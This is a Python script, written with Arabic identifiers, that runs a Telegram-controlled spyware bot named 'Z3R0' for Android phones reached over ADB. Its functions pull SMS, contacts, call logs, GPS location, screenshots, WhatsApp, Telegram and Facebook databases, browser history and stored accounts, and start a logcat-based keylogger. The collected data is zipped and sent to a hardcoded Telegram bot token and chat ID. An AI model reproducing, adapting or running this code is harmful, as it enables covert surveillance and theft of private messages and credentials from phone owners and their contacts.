#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess
import requests
import json
import time
import os
import sys
import re
import sqlite3
import base64
from datetime import datetime
from threading import Thread
import shutil
import logging

# ============================================================
# الإعدادات - تم إدخال التوكن ومعرف الدردشة مسبقاً
# ============================================================

TOKEN = "8930250583:AAFhqLVJ1Cod9WniYZdIoXbgd4rDnqVSyMg"
CHAT_ID = "1042954707"

# كشف مسار ADB تلقائياً
ADB_PATHS = [
    "/usr/bin/adb",
    "/usr/local/bin/adb",
    "./adb",
    "adb",
    "/home/container/adb",
    "/app/adb"
]

ADB_PATH = None
for path in ADB_PATHS:
    if os.path.exists(path) or subprocess.run(f"which {path}", shell=True, capture_output=True).returncode == 0:
        ADB_PATH = path
        break

if not ADB_PATH:
    ADB_PATH = "adb"

# ============================================================
# محرك التحكم الأساسي
# ============================================================

class جهاز_التحكم:
    def __init__(self):
        self.متصل = False
        self.مسار_التخزين = "./البيانات_المستخرجة"
        os.makedirs(self.مسار_التخزين, exist_ok=True)
        self.تسجيل_نشط = False
        
    def تنفيذ(self, الأمر, المهلة=30):
        try:
            النتيجة = subprocess.run(
                f"{ADB_PATH} {الأمر}",
                shell=True,
                capture_output=True,
                text=True,
                timeout=المهلة
            )
            return النتيجة.stdout.strip() or النتيجة.stderr.strip()
        except subprocess.TimeoutExpired:
            return "انتهاء المهلة"
        except Exception as e:
            return f"خطأ: {e}"
    
    def فحص_الاتصال(self):
        الناتج = self.تنفيذ("devices")
        if "device" in الناتج and "unauthorized" not in الناتج:
            self.متصل = True
            return True
        return False
    
    def معلومات_الجهاز(self):
        if not self.فحص_الاتصال():
            return "❌ الجهاز غير متصل"
        
        البيانات = {
            "الموديل": self.تنفيذ("shell getprop ro.product.model"),
            "المصنع": self.تنفيذ("shell getprop ro.product.manufacturer"),
            "النسخة": self.تنفيذ("shell getprop ro.build.version.release"),
            "السdk": self.تنفيذ("shell getprop ro.build.version.sdk"),
            "البطارية": self.تنفيذ("shell dumpsys battery | grep level").replace("level:", "").strip() + "%",
            "الشحن": "نعم" if "true" in self.تنفيذ("shell dumpsys battery | grep 'AC powered'") else "لا",
            "التخزين": self.تنفيذ("shell df -h /storage/emulated/0 | tail -1 | awk '{print $4}'"),
            "الشاشة": self.تنفيذ("shell dumpsys power | grep 'mWakefulness'").split("=")[-1],
            "وقت_التشغيل": self.تنفيذ("shell cat /proc/uptime").split()[0][:8]
        }
        
        return f"""
📱 **معلومات الجهاز**
━━━━━━━━━━━━━━━━
📌 الموديل: {البيانات['الموديل']}
🏷️ المصنع: {البيانات['المصنع']}
📱 أندرويد: {البيانات['النسخة']} (SDK {البيانات['السdk']})
🔋 البطارية: {البيانات['البطارية']}
⚡ الشحن: {البيانات['الشحن']}
💾 المساحة الحرة: {البيانات['التخزين']}
🔄 حالة الشاشة: {البيانات['الشاشة']}
⏱️ وقت التشغيل: {البيانات['وقت_التشغيل']}ث
"""
    
    def لقطة_شاشة(self):
        if not self.فحص_الاتصال():
            return None
        الوقت = datetime.now().strftime("%Y%m%d_%H%M%S")
        اسم_الملف = f"/sdcard/screen_{الوقت}.png"
        self.تنفيذ(f"shell screencap -p {اسم_الملف}")
        self.تنفيذ(f"pull {اسم_الملف} screen_{الوقت}.png")
        self.تنفيذ(f"shell rm {اسم_الملف}")
        return f"screen_{الوقت}.png"
    
    def قائمة_التطبيقات(self):
        if not self.فحص_الاتصال():
            return "❌ الجهاز غير متصل"
        الناتج = self.تنفيذ("shell pm list packages -f")
        التطبيقات = []
        كلمات_اجتماعية = ['facebook', 'instagram', 'whatsapp', 'twitter', 'tiktok', 
                          'telegram', 'snapchat', 'youtube', 'messenger', 'reddit',
                          'discord', 'linkedin', 'pinterest', 'tumblr', 'wechat']
        
        for سطر in الناتج.split('\n'):
            if '=' in سطر:
                اسم_الحزمة = سطر.split('=')[-1]
                التطبيقات.append(اسم_الحزمة)
        
        التطبيقات_الاجتماعية = []
        for تطبيق in التطبيقات:
            for كلمة in كلمات_اجتماعية:
                if كلمة in تطبيق.lower():
                    التطبيقات_الاجتماعية.append(تطبيق)
                    break
        
        النتيجة = f"📱 **عدد التطبيقات:** {len(التطبيقات)}\n"
        النتيجة += f"🌐 **التطبيقات الاجتماعية:** {len(التطبيقات_الاجتماعية)}\n━━━━━━━━━━━━━━━━\n"
        for i, تطبيق in enumerate(التطبيقات_الاجتماعية[:20], 1):
            النتيجة += f"{i}. {تطبيق}\n"
        if len(التطبيقات_الاجتماعية) > 20:
            النتيجة += f"\n... و {len(التطبيقات_الاجتماعية)-20} تطبيق آخر"
        return النتيجة
    
    def رسائل_النصية(self):
        if not self.فحص_الاتصال():
            return "❌ الجهاز غير متصل"
        الرسائل = self.تنفيذ("shell content query --uri content://sms/ --projection address:body:date:type")
        with open(f"{self.مسار_التخزين}/جميع_الرسائل.txt", "w", encoding='utf-8') as f:
            f.write(الرسائل)
        return f"✅ تم استخراج {len(الرسائل.split('address'))-1} رسالة"
    
    def جهات_الاتصال(self):
        if not self.فحص_الاتصال():
            return "❌ الجهاز غير متصل"
        الجهات = self.تنفيذ("shell content query --uri content://contacts/phones")
        with open(f"{self.مسار_التخزين}/جهات_الاتصال.txt", "w", encoding='utf-8') as f:
            f.write(الجهات)
        return f"✅ تم استخراج {len(الجهات.split('display_name'))-1} جهة اتصال"
    
    def سجل_المكالمات(self):
        if not self.فحص_الاتصال():
            return "❌ الجهاز غير متصل"
        المكالمات = self.تنفيذ("shell content query --uri content://call_log/calls")
        with open(f"{self.مسار_التخزين}/سجل_المكالمات.txt", "w", encoding='utf-8') as f:
            f.write(المكالمات)
        return f"✅ تم استخراج {len(المكالمات.split('number'))-1} مكالمة"
    
    def الموقع(self):
        if not self.فحص_الاتصال():
            return "❌ الجهاز غير متصل"
        
        self.تنفيذ("shell settings put secure location_providers_allowed +gps")
        الناتج = self.تنفيذ("shell dumpsys location")
        
        الاحداثيات = re.search(r'last known.*?lat=([\d.-]+).*?long=([\d.-]+)', الناتج, re.DOTALL)
        if الاحداثيات:
            خط_العرض, خط_الطول = الاحداثيات.groups()
            return f"📍 **الموقع الحالي**\nخط العرض: {خط_العرض}\nخط الطول: {خط_الطول}\n🌐 https://maps.google.com/?q={خط_العرض},{خط_الطول}"
        return "❌ تعذر تحديد الموقع - فعّل GPS"
    
    def واتساب(self):
        if not self.فحص_الاتصال():
            return "❌ الجهاز غير متصل"
        try:
            self.تنفيذ("shell run-as com.whatsapp cp /data/data/com.whatsapp/databases/msgstore.db /sdcard/")
            self.تنفيذ("shell run-as com.whatsapp cp /data/data/com.whatsapp/databases/wa.db /sdcard/")
            self.تنفيذ(f"pull /sdcard/msgstore.db {self.مسار_التخزين}/whatsapp_msgstore.db")
            self.تنفيذ(f"pull /sdcard/wa.db {self.مسار_التخزين}/whatsapp_wa.db")
            self.تنفيذ("shell rm /sdcard/msgstore.db /sdcard/wa.db")
            return "✅ تم استخراج بيانات واتساب"
        except:
            return "❌ فشل استخراج واتساب"
    
    def تيليجرام(self):
        if not self.فحص_الاتصال():
            return "❌ الجهاز غير متصل"
        try:
            self.تنفيذ("shell run-as org.telegram.messenger cp /data/data/org.telegram.messenger/files/* /sdcard/")
            self.تنفيذ(f"pull /sdcard/*.db {self.مسار_التخزين}/telegram_")
            self.تنفيذ("shell rm /sdcard/*.db")
            return "✅ تم استخراج بيانات تيليجرام"
        except:
            return "❌ فشل استخراج تيليجرام"
    
    def انستغرام(self):
        if not self.فحص_الاتصال():
            return "❌ الجهاز غير متصل"
        try:
            المسار = "/sdcard/Android/media/com.instagram.android/"
            self.تنفيذ(f"pull {المسار} {self.مسار_التخزين}/instagram_media/")
            return "✅ تم استخراج وسائط انستغرام"
        except:
            return "❌ فشل استخراج انستغرام"
    
    def جميع_وسائل_التواصل(self):
        النتائج = []
        النتائج.append(self.واتساب())
        النتائج.append(self.تيليجرام())
        النتائج.append(self.انستغرام())
        try:
            self.تنفيذ("shell run-as com.facebook.katana cp /data/data/com.facebook.katana/databases/* /sdcard/")
            self.تنفيذ("pull /sdcard/*.db ./facebook_data/")
            النتائج.append("✅ تم استخراج بيانات فيسبوك")
        except:
            النتائج.append("❌ فشل استخراج فيسبوك")
        return "\n".join(النتائج)
    
    def بدء_تسجيل_الكيبورد(self):
        if not self.فحص_الاتصال():
            return "❌ الجهاز غير متصل"
        self.تنفيذ("shell logcat -c")
        self.تنفيذ("shell logcat -v time -f /sdcard/keylog.txt &")
        self.تسجيل_نشط = True
        return "⌨️ بدأ تسجيل الكيبورد"
    
    def ايقاف_تسجيل_الكيبورد(self):
        self.تنفيذ("shell killall logcat")
        self.تسجيل_نشط = False
        return "⌨️ تم إيقاف تسجيل الكيبورد"
    
    def جلب_سجل_الكيبورد(self):
        if not self.فحص_الاتصال():
            return "❌ الجهاز غير متصل"
        self.تنفيذ("pull /sdcard/keylog.txt ./keylog.txt")
        try:
            with open("keylog.txt", "r", encoding='utf-8', errors='ignore') as f:
                المحتوى = f.read()
            return المحتوى[-5000:] if len(المحتوى) > 5000 else المحتوى
        except:
            return "❌ لا توجد بيانات تسجيل"
    
    def استخراج_جميع_الملفات(self):
        if not self.فحص_الاتصال():
            return "❌ الجهاز غير متصل"
        المسارات = [
            "/sdcard/DCIM/",
            "/sdcard/Download/",
            "/sdcard/Music/",
            "/sdcard/Movies/",
            "/sdcard/Documents/",
            "/sdcard/Pictures/",
            "/sdcard/WhatsApp/",
            "/sdcard/Telegram/",
        ]
        for مسار in المسارات:
            try:
                المجلد = مسار.split("/")[-2] or "root"
                self.تنفيذ(f"pull {مسار} {self.مسار_التخزين}/{المجلد}_نسخ/")
            except:
                continue
        return "✅ تم استخراج جميع الملفات"
    
    def تاريخ_المتصفح(self):
        if not self.فحص_الاتصال():
            return "❌ الجهاز غير متصل"
        try:
            self.تنفيذ("shell run-as com.android.chrome cat /data/data/com.android.chrome/app_chrome/Default/History > /sdcard/chrome_history.txt")
            self.تنفيذ("pull /sdcard/chrome_history.txt ./chrome_history.txt")
            with open("chrome_history.txt", "r", encoding='utf-8', errors='ignore') as f:
                التاريخ = f.read()
            return التاريخ[:5000]
        except:
            return "❌ تاريخ المتصفح غير متوفر"
    
    def كلمات_المرور(self):
        if not self.فحص_الاتصال():
            return "❌ الجهاز غير متصل"
        الحسابات = self.تنفيذ("shell dumpsys account")
        with open(f"{self.مسار_التخزين}/الحسابات_المخزنة.txt", "w", encoding='utf-8') as f:
            f.write(الحسابات)
        return "✅ تم استخراج الحسابات المخزنة"
    
    def ملفات_الوسائط(self):
        if not self.فحص_الاتصال():
            return "❌ الجهاز غير متصل"
        الامتدادات = [".jpg", ".jpeg", ".png", ".gif", ".mp4", ".avi", ".mkv", ".3gp", ".mp3", ".wav"]
        for امتداد in الامتدادات:
            self.تنفيذ(f"shell find /sdcard/ -name '*{امتداد}' 2>/dev/null >> /sdcard/media_files.txt")
        self.تنفيذ("pull /sdcard/media_files.txt ./media_files.txt")
        return "✅ تم استخراج قائمة ملفات الوسائط"
    
    def ضغط_البيانات(self):
        اسم_الملف = f"بيانات_الجهاز_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        shutil.make_archive(اسم_الملف, 'zip', self.مسار_التخزين)
        return f"{اسم_الملف}.zip"
    
    def استخراج_كل_شيء(self):
        النتائج = []
        النتائج.append("🔄 بدء الاستخراج الشامل...")
        النتائج.append(self.رسائل_النصية())
        النتائج.append(self.جهات_الاتصال())
        النتائج.append(self.سجل_المكالمات())
        النتائج.append(self.استخراج_جميع_الملفات())
        النتائج.append(self.ملفات_الوسائط())
        النتائج.append(self.تاريخ_المتصفح())
        النتائج.append(self.كلمات_المرور())
        النتائج.append(self.واتساب())
        النتائج.append(self.تيليجرام())
        return "\n".join(النتائج)
    
    def تنظيف(self):
        shutil.rmtree(self.مسار_التخزين, ignore_errors=True)
        os.makedirs(self.مسار_التخزين, exist_ok=True)
        return "🧹 تم التنظيف"

# ============================================================
# محرك بوت تيليجرام
# ============================================================

class بوت_تيليجرام:
    def __init__(self):
        self.الجهاز = جهاز_التحكم()
        self.آخر_تحديث = 0
        
    def إرسال_رسالة(self, النص, ملف=None):
        try:
            if ملف and os.path.exists(ملف):
                if ملف.endswith(('.jpg', '.jpeg', '.png', '.gif')):
                    الرابط = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
                    الملفات = {'photo': open(ملف, 'rb')}
                elif ملف.endswith('.zip'):
                    الرابط = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
                    الملفات = {'document': open(ملف, 'rb')}
                else:
                    الرابط = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
                    الملفات = {'document': open(ملف, 'rb')}
                البيانات = {'chat_id': CHAT_ID, 'caption': النص[:200]}
                requests.post(الرابط, files=الملفات, data=البيانات, timeout=30)
                return
            
            الرابط = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
            البيانات = {'chat_id': CHAT_ID, 'text': النص, 'parse_mode': 'Markdown'}
            requests.post(الرابط, json=البيانات, timeout=10)
        except Exception as e:
            print(f"خطأ في الإرسال: {e}")
    
    def معالجة_الأمر(self, النص):
        if not النص:
            return None
        
        الأمر = النص.strip().lower()
        
        if الأمر == "/start":
            return """🛡️ **نظام Z3R0 للتحكم بالهواتف**
━━━━━━━━━━━━━━━━
📱 **الأوامر المتاحة:**

**معلومات:**
/info - معلومات الجهاز
/apps - قائمة التطبيقات

**اتصالات:**
/sms - الرسائل النصية
/contacts - جهات الاتصال
/calls - سجل المكالمات

**وسائل التواصل:**
/whatsapp - بيانات واتساب
/telegram - بيانات تيليجرام
/instagram - وسائط انستغرام
/social - جميع وسائل التواصل

**تتبع:**
/location - الموقع الجغرافي
/screenshot - لقطة شاشة

**مراقبة:**
/keylog_start - بدء تسجيل الكيبورد
/keylog_stop - إيقاف التسجيل
/keylog_get - جلب سجل الكيبورد

**ملفات:**
/files - جميع الملفات
/media - ملفات الوسائط
/browser - تاريخ المتصفح

**متقدم:**
/extract_all - استخراج كل شيء
/zip - ضغط وإرسال البيانات
/cleanup - تنظيف الملفات المؤقتة
"""
        
        elif الأمر == "/info":
            return self.الجهاز.معلومات_الجهاز()
        
        elif الأمر == "/apps":
            return self.الجهاز.قائمة_التطبيقات()
        
        elif الأمر == "/sms":
            return self.الجهاز.رسائل_النصية()
        
        elif الأمر == "/contacts":
            return self.الجهاز.جهات_الاتصال()
        
        elif الأمر == "/calls":
            return self.الجهاز.سجل_المكالمات()
        
        elif الأمر == "/location":
            return self.الجهاز.الموقع()
        
        elif الأمر == "/screenshot":
            الملف = self.الجهاز.لقطة_شاشة()
            if الملف and os.path.exists(الملف):
                self.إرسال_رسالة("📸 لقطة شاشة", الملف)
                os.remove(الملف)
                return "✅ تم إرسال لقطة الشاشة"
            return "❌ فشل التقاط الشاشة"
        
        elif الأمر == "/whatsapp":
            return self.الجهاز.واتساب()
        
        elif الأمر == "/telegram":
            return self.الجهاز.تيليجرام()
        
        elif الأمر == "/instagram":
            return self.الجهاز.انستغرام()
        
        elif الأمر == "/social":
            return self.الجهاز.جميع_وسائل_التواصل()
        
        elif الأمر == "/keylog_start":
            return self.الجهاز.بدء_تسجيل_الكيبورد()
        
        elif الأمر == "/keylog_stop":
            return self.الجهاز.ايقاف_تسجيل_الكيبورد()
        
        elif الأمر == "/keylog_get":
            return self.الجهاز.جلب_سجل_الكيبورد()
        
        elif الأمر == "/files":
            return self.الجهاز.استخراج_جميع_الملفات()
        
        elif الأمر == "/media":
            return self.الجهاز.ملفات_الوسائط()
        
        elif الأمر == "/browser":
            return self.الجهاز.تاريخ_المتصفح()
        
        elif الأمر == "/extract_all":
            return self.الجهاز.استخراج_كل_شيء()
        
        elif الأمر == "/zip":
            الملف_المضغوط = self.الجهاز.ضغط_البيانات()
            if os.path.exists(الملف_المضغوط):
                self.إرسال_رسالة("📦 جميع بيانات الجهاز", الملف_المضغوط)
                return "✅ تم إرسال ملف البيانات المضغوط"
            return "❌ فشل الضغط"
        
        elif الأمر == "/cleanup":
            return self.الجهاز.تنظيف()
        
        else:
            return None
    
    def الاستماع(self):
        self.إرسال_رسالة("🛡️ **نظام Z3R0 جاهز**\nفي انتظار الأوامر.")
        self.إرسال_رسالة(f"📱 حالة الجهاز: {'✅ متصل' if self.الجهاز.فحص_الاتصال() else '❌ غير متصل'}")
        
        while True:
            try:
                الرابط = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
                البيانات = {'offset': self.آخر_تحديث + 1, 'timeout': 30}
                الاستجابة = requests.get(الرابط, json=البيانات, timeout=35)
                
                if الاستجابة.status_code == 200:
                    for تحديث in الاستجابة.json().get('result', []):
                        self.آخر_تحديث = تحديث['update_id']
                        
                        if 'message' in تحديث:
                            الرسالة = تحديث['message']
                            if 'text' in الرسالة and str(الرسالة['chat']['id']) == CHAT_ID:
                                نص_الأمر = الرسالة['text']
                                الرد = self.معالجة_الأمر(نص_الأمر)
                                if الرد:
                                    self.إرسال_رسالة(الرد)
                
                time.sleep(2)
                
            except Exception as e:
                print(f"خطأ في الاستماع: {e}")
                time.sleep(5)

# ============================================================
# التشغيل الرئيسي
# ============================================================

if __name__ == "__main__":
    print("🛡️ نظام Z3R0 - جاهز للتشغيل")
    print("📱 في انتظار الأوامر من تيليجرام...")
    
    البوت = بوت_تيليجرام()
    البوت.الاستماع()